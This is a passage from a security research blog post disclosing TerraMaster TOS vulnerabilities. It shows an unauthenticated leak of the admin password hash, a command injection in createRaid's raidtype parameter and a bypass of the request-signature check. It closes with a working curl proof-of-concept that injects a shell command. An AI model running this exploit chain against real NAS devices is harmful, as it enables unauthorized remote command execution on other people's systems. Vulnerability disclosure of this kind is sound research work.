&gt; User-Agent: TNAS &lt; HTTP/1.1 200 OK &lt; Date: Mon, 10 Jan 2022 14:10:40 GMT &lt; Content-Type: application/json; charset=utf-8 &lt; Transfer-Encoding: chunked &lt; Connection: keep-alive &lt; X-Powered-By: TerraMaster * Connection #0 to host 127.0.0.1 left intact {"code":true,"msg":"webNasIPS successful","data":"NOTIFY Message\nIFC:10.0.2.2\nADDR:525400123456\nPWD:$1$2kc1Zqe8$gighkBlDDDFHpG3RkZtws1\nSAT:1\nDAT:[{\"hostname\":\"ubuntu1604-aarch64\",\"firmware\":\"TOS3_A1.0_4.2.17\",\"sn\":\"\",\"version\":\"2110301418\"},{\"network\":\"eth0\",\"ip\":\"10.0.2.15\",\"mask\":\"255.255.255.0\",\"mac\":\"52:54:00:12:34:56\"},{\"service\":[{\"name\":\"http_ssl\",\"url\":\"\",\"port\":\"5443\"},{\"name\":\"http\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"sys\",\"url\":\"XXXX\",\"port\":\"8181\"},{\"name\":\"channel\",\"url\":\"\",\"port\":0},{\"name\":\"pt\",\"url\":\"\",\"port\":0},{\"name\":\"ftp\",\"url\":\"\",\"port\":21},{\"name\":\"web_dav\",\"url\":\"\",\"port\":0},{\"name\":\"smb\",\"url\":\"\",\"port\":0}]}]","time":2.920037031173706}</pre>
<p>It returns a lot of interesting data. Let&#8217;s look at the function webNasIPS</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">function webNasIPS() { 
    if (strstr($_SERVER['HTTP_USER_AGENT'], "TNAS")) { 
        $core = new core(); 
        $dataSheet[0] = [ 
            "hostname" =&gt; $core-&gt;_hostname(), 
            "firmware" =&gt; $core-&gt;_version(), 
            "sn" =&gt; $core-&gt;_system_product_name(), 
            "version" =&gt; $core-&gt;_VersionNumber() 
        ]; 
        $defaultgw = $core-&gt;_default_RJ45(); 
        $eth = $core-&gt;_netlist($defaultgw); 
        $dataSheet[1] = array(
            "network" =&gt; $defaultgw, 
            "ip" =&gt; $eth['ip'], 
            "mask" =&gt; $eth['mask'], 
            "mac" =&gt; $eth['mac']
        ); 
        $dataSheet[2] = array("service" =&gt; $this-&gt;_getservicelist()); 
        $ifc = $_SERVER['REMOTE_ADDR']; 
        $addr = preg_replace("/[:\n\r]+/", "", file_get_contents("/sys/class/net/eth0/address")); 
        $pwd = $this-&gt;REQUESTCODE; 
        if (!file_exists("/tmp/databack/complete")) { 
            $sat = -1; 
        } else if (!empty($this-&gt;_exec("df-json | awk '/\/mnt\/md/'"))) { 
            $sat = !file_exists(USER_SYSTEM . '/install.lock') ? 2 : 1; 
        } else { 
            $sat = 0; 
        } $dat = addslashes(json_encode($dataSheet)); 
        $tpl = "NOTIFY Message\\nIFC:$ifc\\nADDR:$addr\\nPWD:$pwd\\nSAT:$sat\\nDAT:$dat"; 
        $this-&gt;output("webNasIPS successful", true, $tpl); 
    } 
    $this-&gt;output("webNasIPS failed", false, ""); 
}</pre>
<p class="EnlighterJSRAW" data-enlighter-language="php">It returns the TOS firmware version, the default gateway interface&#8217;s IP and mac address, running services with their binding address and their ports, and a variable <code class="EnlighterJSRAW" data-enlighter-language="php">$pwd</code> which contains the value of <code class="EnlighterJSRAW" data-enlighter-language="php">$this-&gt;REQUESTCODE</code>. Upon checking the origins of <code class="EnlighterJSRAW" data-enlighter-language="php">REQUESTCODE</code>, we see that it is set in <code class="EnlighterJSRAW" data-enlighter-language="php">application.class.php</code></p>
<p class="EnlighterJSRAW" data-enlighter-language="php">The <code class="EnlighterJSRAW" data-enlighter-language="php">_getpassword</code>functions essentially tells that REQUESTCODE is the hash of the admin password. This makes the above information leak a very dire one.</p>
<h2>Finding an OS command injection: CVE-2022-24989</h2>
<p>If we remember earlier, one of the checks in <code class="EnlighterJSRAW" data-enlighter-language="php">mobile.class.php</code> is:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">if (!in_array(Action, self::$notHeader)) { 
    if (!strstr($_SERVER['HTTP_USER_AGENT'], "TNAS") || !isset($_SERVER['HTTP_AUTHORIZATION']) || $this-&gt;REQUESTCODE != $_SERVER['HTTP_AUTHORIZATION']) { 
        $this-&gt;output("Illegal request, please use genuine software!", false); 
    } 
}</pre>
<p>Since  <code class="EnlighterJSRAW" data-enlighter-language="php">webNasIPS</code> gives us REQUESTCODE without authentication, we can now call from the seven functions we listed which are in <code class="EnlighterJSRAW" data-enlighter-language="php">NOT_LOGIN_CHECK</code>and in <code class="EnlighterJSRAW" data-enlighter-language="php">$notCheck</code> array, but NOT in <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeader</code> <span style="font-size: revert; color: initial;">arrary. <code class="EnlighterJSRAW" data-enlighter-language="php">createRaid</code> </span><span style="font-size: revert; color: initial;">is one of the functions which fullfills this.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">function createRaid() { 
    $vol = new volume(); 
    if (!isset($this-&gt;in['raidtype']) || !isset($this-&gt;in['diskstring'])){ 
        $this-&gt;output("Incomplete parameters", false); 
    } 
    $ret = $vol-&gt;volume_make_from_disks($this-&gt;in['raidtype'], $filesystem, $disks, $volume_size); 
}</pre>
<p class="EnlighterJSRAW" data-enlighter-language="php">createRaid takes two POST parameters by <code class="EnlighterJSRAW" data-enlighter-language="php">raidtype</code> and <code class="EnlighterJSRAW" data-enlighter-language="php">diskstring</code> and calls <code class="EnlighterJSRAW" data-enlighter-language="php">$vol-&gt;volume_make_from_disks</code> with the value of <code class="EnlighterJSRAW" data-enlighter-language="php">raidtype</code> as the first parameter. Let&#8217;s have a closer look at <code class="EnlighterJSRAW" data-enlighter-language="php">volume_make_from_disks</code> defined in <code class="EnlighterJSRAW" data-enlighter-language="php">volume.class.php</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">function volume_make_from_disks($level, $fs, $disks, $volume_size) { 
    $this-&gt;fun-&gt;_backexec("$_makemd -s{$volume_size} -l{$level} -b -t{$fs} {$diskItems} &amp;"); 
}</pre>
<p>It takes the first parameter and inserts it into a string to call another function <code class="EnlighterJSRAW" data-enlighter-language="php">$this-&gt;fun-&gt;_backexec</code>. <code class="EnlighterJSRAW" data-enlighter-language="php">_backexec</code> is a function defined in <code class="EnlighterJSRAW" data-enlighter-language="php">func.class.php</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">function _backexec($command) { 
     if (strstr($command, "regcloud")) { 
          @system("killall -9 regcloud"); 
     } 
     $fp = popen($command, "w"); 
     if ($fp == FALSE) return FALSE; 
     pclose($fp); 
     return TRUE; 
}</pre>
<p><code class="EnlighterJSRAW" data-enlighter-language="php">_backexec</code> <span style="font-size: revert; color: initial;">function passes the parameters it receives to <code class="EnlighterJSRAW" data-enlighter-language="php">popen</code></span><span style="font-size: revert; color: initial;"> without any sanitization. Therefore, it&#8217;s vulnerable to OS command injection.</span></p>
<h2>Bypassing Timestamp header checks</h2>
<p>We have now chained the information leak (admin password hash) with an OS injection vulnerability. But we have to return to <code class="EnlighterJSRAW" data-enlighter-language="php">api.php</code> timestamp header check that we said we will look at later.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">$instance = new $class(); 
if (!in_array($function, $class::$notHeader)) { 
    #防止请求重放验证... 
    if (tos_encrypt_str($_SERVER['HTTP_TIMESTAMP']) != $_SERVER['HTTP_SIGNATURE'] || $_SERVER['REQUEST_TIME'] - $_SERVER['HTTP_TIMESTAMP'] &gt; 300) { 
        $instance-&gt;output("Illegal request, timeout!", 0); 
    } 
} 
$instance-&gt;$function();</pre>
<p>api.php ensures that if the method name is not in the class&#8217;s <code class="EnlighterJSRAW" data-enlighter-language="php">$notHeader</code> array, it will check that the TIMESTAMP header is not older than 300 seconds (5 minutes), and the SIGNATURE header has to be equal to the output of <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code> function call on the TIMESTAMP value. Now, we have three problems.</p>
<ul>
<li>We have to get the time of the machine</li>
<li>We have to know how <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code> is invoked, and call it with arbitrary value</li>
<li>We have to calculate the right TIMESTAMP in epoch time from the machine&#8217;s time regardless of time difference</li>
</ul>
<p>Let&#8217;s start with tos_encrypt_str.</p>
<h2>Figuring out the custom hash function</h2>
<p>Upon searching <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code>, we realize that it&#8217;s not defined in the PHP scripts. And after a google search, we realize that it&#8217;s not also in the default and common list of php extentions. This leads us to the conclusion that it&#8217;s a function in one of TerraMaster&#8217;s custom PHP extenstions. Listing the loaded PHP extensions:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">$ php -m 
... 
pgsql 
Phar 
php_terra_master 
posix 
redis 
...</pre>
<p>The extension <code class="EnlighterJSRAW" data-enlighter-language="php">php_terra_master.so</code> sticks out. It exports one function, <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">$ php -r 'var_dump((new ReflectionExtension("php_terra_master"))-&gt;getFunctions());' 
 array(1) { 
    ["tos_encrypt_str"] =&gt; object(ReflectionFunction)
 #2 (1) { 
    ["name"]=&gt; string(15) "tos_encrypt_str" 
}}</pre>
<p>Calling <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code> will tell us that it returns a hash.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">$ php php -r 'echo tos_encrypt_str("XXXX") . PHP_EOL;' 
6873abbd2da7dca265b78e64ead3729b</pre>
<p>Opening the shared object in IDA, and searching for the string <code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code>, we find out that the hashing function is <code class="EnlighterJSRAW" data-enlighter-language="php">sub_3738</code>.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">result = zend_parse_parameters(v3, “s”, &amp;v8, &amp;v10); 
if ( (_DWORD)result != -1 ) { 
   v5 = (const char *)sub_3694(&amp;v9); 
   php_sprintf(v11, “%s%s”, v5, v8); 
   v6 = (const char *)sub_2348(v11); 
   v7 = zend_strpprintf(0LL, “%s”, v6);</pre>
<p>It takes our string to be hashed from <code class="EnlighterJSRAW" data-enlighter-language="php">zend_parse_parameters</code>, and passes it to <code class="EnlighterJSRAW" data-enlighter-language="php">php_sprintf</code> (using variable <code class="EnlighterJSRAW" data-enlighter-language="php">v8</code>). Before the php_sprintf call, there is a function call <code class="EnlighterJSRAW" data-enlighter-language="php">sub_3694</code>, whose return value is given to the php_sprintf call as parameter, with our string. Let’s take a look at it.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">__int64 __fastcall sub_3694(__int64 a1) { 
    int v2; 
    // w21 const char *v3; 
    // x0 char v5[40]; 
    // [xsp+38h] [xbp+38h] 
    BYREF v2 = socket(2, 1, 0); 
    if ( (v2 &amp; 0x80000000) != 0 ) { 
        v3 = "socket"; 
        LABEL_5: perror(v3); 
        return 0LL; 
    } 
    strcpy(v5, "eth0"); 
    if ( (ioctl(v2, 0x8927uLL, v5) &amp; 0x80000000) != 0 ) { 
        v3 = "ioctl"; 
        goto LABEL_5; 
    } 
    php_sprintf(a1, "%02x%02x%02x", (unsigned __int8)v5[21], (unsigned __int8)v5[22], (unsigned __int8)v5[23]); 
    return a1; 
}</pre>
<p>This function gets the mac address of the interface <code class="EnlighterJSRAW" data-enlighter-language="php">eth0</code> and returns the last 3 bytes (device specific part) in hex. Then the <code class="EnlighterJSRAW" data-enlighter-language="php">php_sprintf</code> in sub_3738 call formats it with our string to a final string to give it to <code class="EnlighterJSRAW" data-enlighter-language="php">sub_2348</code>. Therefore, if the mac address of eth0 for a device is <em>55:44:33:12:34:56</em> and our string to be hashed is <em>XXXX</em>, then the final string given to the actuall hash function (sub_2348) will be <em>123456XXXX</em>.</p>
<h2>Getting the later half of the mac</h2>
<p><code class="EnlighterJSRAW" data-enlighter-language="php">tos_encrypt_str</code> using the later half of the mac address of eth0 allows each TerraMaster device to derive different hashes for the same string. This prevents us from calling the function with arbitrary stirng, since we need the mac address.</p>
<p>Lucky for us, <code class="EnlighterJSRAW" data-enlighter-language="php">webNasIPS</code>, which leaks the admin password hash, also gives us the mac address of the default gateway interface, which is often eth0. Armed with the later half of the mac address, we can write a small hook to call tos_encrypt_str with any string value we want to generate the hash.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">function webNasIPS() { 
   $dataSheet[1] = array(
       "network" =&gt; $defaultgw, 
       "ip" =&gt; $eth['ip'], 
       "mask" =&gt; $eth['mask'], 
       "mac" =&gt; $eth['mac'
   ]); 
}</pre>
<h2>Another information leak: time of the machine</h2>
<p>Now that we can generate the right hash for any arbitrary string for any TerraMaster device, the only remaining piece is the timestamp value. On some TerraMaster TOS devices, there is a <code class="EnlighterJSRAW" data-enlighter-language="php">Date</code> header that tells us what timezone the target machine is synched to, so we can sync our time with the victim and have an accurate timestamp. However, on TerraMaster devices, it is hardened and the <code class="EnlighterJSRAW" data-enlighter-language="php">Date</code> header is stripped so it is not easy for us to figure out what timezone the machine is synched to.</p>
<p>Upon replaying with the request, we realize that sending a request to any of these functions in a way that the result is a failure will yield the time of the machine being leaked. Here is a simple request to call <code class="EnlighterJSRAW" data-enlighter-language="php">createRaid</code> with no AUTHORIZATION, TIMESTAMP and SIGNATURE headers.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="powershell">$ curl -k 'http://127.0.0.1:22056/module/api.php?mobile/createRaid' | jq -r 
{ 
 "code": false, 
 "msg": "Illegal request, please use genuine software!", 
 "data": [], 
 "time": 0.00028896331787109375, 
 "ctime": "2022-01-10 23:00:38" 
}</pre>
<p>In the request, there is a value of <code class="EnlighterJSRAW" data-enlighter-language="php">ctime</code>, which contains the date of the machine with the 24 hour format.</p>
<p>Now, with all the pieces on our hand, the only remaining task is to calculate the timestamp in epoch regardless of the machine&#8217;s timezone.</p>
<h2>Calculating the timestamp</h2>
<p>To do this, we can use any unix <a href="https://www.unixtimestamp.com/index.php">timestamp calculator</a>. These are the steps to do that.</p>
<ul>
<li>We take the time of the machine from the <code class="EnlighterJSRAW" data-enlighter-language="php">ctime</code> and convert it to epoch time</li>
<li>We calculate our own time (both formal and epoch) (for example: using PHP&#8217;s <code class="EnlighterJSRAW" data-enlighter-language="php">date</code> functionality: <code class="EnlighterJSRAW" data-enlighter-language="php">php -r 'echo time() . " " . date("Y-m-d H:i:s") . PHP_EOL; '</code>)</li>
<li>We subtract the epoch time of our machine from the target machine</li>
<li>We convert the subtraction result of the above calculation into relative time</li>
<li>We add/subtract the relative time to our machine&#8217;s formal time</li>
<li>We convert the result from the above calculation to epoch time</li>
<li>We now have the right epoch time. We calculate the hash of this epoch time using the machine&#8217;s later half of the mac</li>
<li>We invoke <code class="EnlighterJSRAW" data-enlighter-language="php">createRaid</code> with our payload in <code class="EnlighterJSRAW" data-enlighter-language="php">raidtype</code></li>
</ul>
<h2>Exploitation</h2>
<p>The final payload will look something like this.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$ curl -vk 'http://XXXX/module/api.php?mobile/createRaid' -H 'User-Agent: TNAS' -H 'AUTHORIZATION: $1$2kc1Zqe8$gi6hkBlDDDFHpG3RkZtws1' -d 'raidtype=;id>/tmp/a.txt;&amp;amp;diskstring=XXXX' -H 'TIMESTAMP: 1642335373' -H 'SIGNATURE: 473a6d90ede9392eebd8a7995a0471fe' | jq -r</pre>
     
        <div class="postmeta">           
            <div class="post-tags"> </div>
            <div class="clear"></div>
        </div><!-- postmeta -->
    </div><!-- .entry-content -->
    <footer class="entry-meta">
          </footer><!-- .entry-meta -->
</article>	<nav role="navigation" id="nav-below" class="post-navigation">
		<h1 class="screen-reader-text">Post navigation</h1>
			<div class="nav-previous"><a href="https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/" rel="prev"><span class="meta-nav">&larr;</span> CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO</a></div>		<div class="nav-next"><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/" rel="next">Bypass CSP Using WordPress By Abusing Same Origin Method Execution <span class="meta-nav">&rarr;</span></a></div>			<div class="clear"></div>
	</nav><!-- #nav-below -->
	          
         </section>       
        <div id="sidebar">    
    <form role="search" method="get" action="https://octagon.net/blog/" class="wp-block-search__button-outside wp-block-search__text-button wp-block-search"    ><label class="wp-block-search__label" for="wp-block-search__input-1" >Search</label><div class="wp-block-search__inside-wrapper " ><input class="wp-block-search__input" id="wp-block-search__input-1" placeholder="" value="" type="search" name="s" required /><button aria-label="Search" class="wp-block-search__button wp-element-button" type="submit" >Search</button></div></form></aside><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Recent Posts</h2><ul class="wp-block-latest-posts__list wp-block-latest-posts"><li><a class="wp-block-latest-posts__post-title" href="https://octagon.net/blog/2022/10/28/juniper-sslvpn-junos-rce-and-multiple-vulnerabilities/">Juniper SSLVPN / JunOS RCE and Multiple Vulnerabilities</a></li>
<li><a class="wp-block-latest-posts__post-title" href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">Bypass CSP Using WordPress By Abusing Same Origin Method Execution</a></li>
<li><a class="wp-block-latest-posts__post-title" href="https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/">CVE-2022-24990: TerraMaster TOS unauthenticated remote command execution via PHP Object Instantiation</a></li>
<li><a class="wp-block-latest-posts__post-title" href="https://octagon.net/blog/2022/03/02/apache-jspwiki-preauth-xss-to-ato/">CVE-2022-24948: Apache JSPWiki preauth Stored XSS to ATO</a></li>
<li><a class="wp-block-latest-posts__post-title" href="https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/">MAMP Server preauth XSS leading to Host Compromise (0day)</a></li>
</ul></div></div></aside><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Archives</h2><ul class="wp-block-archives-list wp-block-archives">	<li><a href='https://octagon.net/blog/2022/10/'>October 2022</a></li>
	<li><a href='https://octagon.net/blog/2022/05/'>May 2022</a></li>
	<li><a href='https://octagon.net/blog/2022/03/'>March 2022</a></li>
	<li><a href='https://octagon.net/blog/2022/01/'>January 2022</a></li>
</ul></div></div></aside><div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-flow wp-block-group-is-layout-flow"><h2 class="wp-block-heading">Categories</h2><ul class="wp-block-categories-list wp-block-categories">	<li class="cat-item cat-item-5"><a href="https://octagon.net/blog/category/bug-bounty-rce-preauth-rce/">bug bounty, rce, preauth rce,</a>
</li>
	<li class="cat-item cat-item-1"><a href="https://octagon.net/blog/category/uncategorized/">Uncategorized</a>
</li>
</ul></div></div></aside>	
</div><!-- sidebar -->        <div class="clear"></div>
    </div><!-- page_content -->
</div><!-- container -->	
<div id="copyright-area">
<div class="copyright-wrapper">
<div class="flex items-center justify-center w-full">
<a href="https://octagon.net">
            <img src="/imgs/oct.png" :src="dark ? '/imgs/oct.png' : '/imgs/oct-dark.png'" style="max-width: 20em;" class="h-auto mx-auto w-56 lg:w-60 mr-1" alt="">
        </a>
</div>           
</div>
</div><!--end .footer-wrapper-->
<script type="text/javascript" src="https://octagon.net/blog/wp-content/plugins/enlighter/cache/enlighterjs.min.js?ver=ffyhGmKLYcacg6v" id="enlighterjs-js"></script>
<script type="text/javascript" id="enlighterjs-js-after">
/* <![CDATA[ */
!function(e,n){if("undefined"!=typeof EnlighterJS){var o={"selectors":{"block":"pre.EnlighterJSRAW","inline":"code.EnlighterJSRAW"},"options":{"indent":4,"ampersandCleanup":true,"linehover":true,"rawcodeDbclick":false,"textOverflow":"break","linenumbers":true,"theme":"enlighter","language":"generic","retainCssClasses":false,"collapse":false,"toolbarOuter":"","toolbarTop":"{BTN_RAW}{BTN_COPY}{BTN_WINDOW}{BTN_WEBSITE}","toolbarBottom":""}};(e.EnlighterJSINIT=function(){EnlighterJS.init(o.selectors.block,o.selectors.inline,o.options)})()}else{(n&&(n.error||n.log)||function(){})("Error: EnlighterJS resources not loaded yet!")}}(window,console);
/* ]]> */
</script>
</body>
</html>